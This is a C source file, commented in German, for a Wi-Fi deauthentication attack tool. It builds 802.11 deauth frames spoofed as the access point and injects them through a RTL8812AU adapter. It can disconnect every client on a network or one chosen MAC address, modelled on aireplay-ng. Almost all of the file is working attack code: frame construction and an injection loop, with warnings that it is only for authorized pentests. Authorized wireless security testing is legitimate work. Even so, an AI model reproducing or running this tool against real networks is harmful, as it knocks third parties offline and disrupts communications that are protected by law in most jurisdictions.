/*
 * deauth — WLAN-Pentest: sendet 802.11 Deauthentication-Frames.
 *
 * NUR gegen Netze verwenden, fuer die eine Testautorisierung vorliegt.
 * Deauth-Frames trennen aktiv fremde Clients vom WLAN -- ohne Autorisierung
 * ist das eine Stoerung der Kommunikation Dritter und in den meisten
 * Rechtsordnungen strafbar. Gedacht fuer autorisierte Pentests der eigenen
 * Infrastruktur (z.B. durch die verantwortliche technische Leitung).
 *
 * Sendet als vermeintlicher AP (SA=BSSID) an Broadcast oder eine gezielte
 * Client-MAC -- dasselbe Muster wie aircrack-ngs `aireplay-ng --deauth`.
 *
 * Usage: ./deauth <kanal> <bssid> [ziel-mac|broadcast] [anzahl] [reason]
 * Default: ziel=broadcast (alle Clients), anzahl=10, reason=7
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "rtl_usb.h"
#include "rtl_hal.h"
#include "rtl_rx.h"
#include "rtl_tx.h"

static int parse_mac(const char *s, uint8_t *m) {
    return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6;
}

static int build_deauth(uint8_t *out, const uint8_t bssid[6], const uint8_t dst[6],
                        uint16_t reason) {
    int p = 0;
    out[p++] = 0xC0; out[p++] = 0x00;      /* FC: Management, Deauthentication */
    out[p++] = 0x00; out[p++] = 0x00;      /* Duration */
    memcpy(out+p, dst,   6); p += 6;       /* Addr1 (DA): Ziel-Client oder Broadcast */
    memcpy(out+p, bssid, 6); p += 6;       /* Addr2 (SA): als AP getarnt */
    memcpy(out+p, bssid, 6); p += 6;       /* Addr3 (BSSID) */
    out[p++] = 0x00; out[p++] = 0x00;      /* Seq Ctl (HW ackt Mgmt-Frames nicht) */
    out[p++] = (uint8_t)(reason & 0xff);   /* Reason Code, little-endian */
    out[p++] = (uint8_t)(reason >> 8);
    return p;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Nutzung: %s <kanal> <bssid> [ziel-mac|broadcast] [anzahl] [reason]\n", argv[0]);
        printf("  ziel default: broadcast (alle Clients trennen)\n");
        printf("  anzahl default: 10, reason default: 7\n\n");
        printf("NUR mit Testautorisierung fuer das Zielnetz verwenden.\n");
        return 1;
    }
    int channel = atoi(argv[1]);
    uint8_t bssid[6];
    if (!parse_mac(argv[2], bssid)) { printf("BSSID ungueltig\n"); return 1; }

    int broadcast_target = !(argc > 3 && strcmp(argv[3], "broadcast") != 0);
    uint8_t dst[6];
    if (broadcast_target) memset(dst, 0xff, 6);
    else if (!parse_mac(argv[3], dst)) { printf("Ziel-MAC ungueltig\n"); return 1; }

    int count = (argc > 4) ? atoi(argv[4]) : 10;
    uint16_t reason = (argc > 5) ? (uint16_t)atoi(argv[5]) : 7;

    printf("Deauth: Kanal %d, BSSID %s, Ziel %s, %d Frames, Reason %u\n",
           channel, argv[2], broadcast_target ? "broadcast (alle Clients)" : argv[3],
           count, reason);
    printf("ACHTUNG: nur mit Autorisierung fuer dieses Netz einsetzen.\n\n");

    libusb_context *ctx = NULL;
    if (libusb_init(&ctx) != 0) { fprintf(stderr, "libusb_init fehlgeschlagen\n"); return 1; }
    libusb_device_handle *h = NULL;
    uint16_t pid = 0; int claimed = 0;
    int rc = rtl_open_first(ctx, &h, &pid, &claimed);
    if (rc == LIBUSB_ERROR_NO_DEVICE) { printf("Kein RTL8812AU gefunden. Adapter einstecken.\n"); libusb_exit(ctx); return 2; }
    if (rc != 0 || !h) { fprintf(stderr, "Oeffnen fehlgeschlagen: %s\n", libusb_error_name(rc)); libusb_exit(ctx); return 1; }
    printf("Geraet 0bda:%04x, Claim: %s\n\n", pid, claimed ? "OK" : "NICHT");

    rtl_rx_bind(ctx, rtl_chip_probe(pid));   /* asynchronen RX-Pfad aktivieren */

    rc = rtl_hal_full_init(h, channel, 0, 1);
    if (rc != 0) { printf("Init fehlgeschlagen (rc=%d).\n", rc); goto done; }

    uint8_t frame[26];
    int flen = build_deauth(frame, bssid, dst, reason);

    long ok = 0, err = 0;
    for (int i = 0; i < count; i++) {
        int r = rtl_tx_inject(h, frame, flen, RTL_RATE_6M, RTL_QSLT_MGNT, RTL_TX_EP_MGMT);
        if (r == 0) ok++; else { err++; if (err <= 3) printf("  TX-Fehler: %s\n", libusb_error_name(r)); }
        usleep(50000);   /* 50ms zwischen Frames -- aireplay-ng's Standardtakt */
    }
    printf("\nFertig: %ld gesendet, %ld Fehler.\n", ok, err);
    if (ok > 0)
        printf("Pruefen: betroffene(r) Client(s) sollten kurz die Verbindung verloren haben.\n");

done:
    rtl_rx_unbind();
    if (claimed) libusb_release_interface(h, 0);
    libusb_close(h);
    libusb_exit(ctx);
    return rc;
}
